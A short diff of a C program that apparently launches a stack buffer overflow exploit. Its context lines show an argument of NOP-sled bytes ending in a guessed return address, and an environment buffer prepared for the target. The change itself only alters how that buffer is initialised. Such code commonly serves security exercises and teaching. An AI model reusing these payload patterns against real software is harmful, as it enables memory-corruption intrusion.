@@ -28,7 +28,7 @@ int main(void)
         "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
         NULL
     };
-    char environment[BUFFER_SIZE] = {0};
+    char environment[BUFFER_SIZE] = {};
     prepareEnvironment(environment);
     char *env[] = {environment, NULL};
 
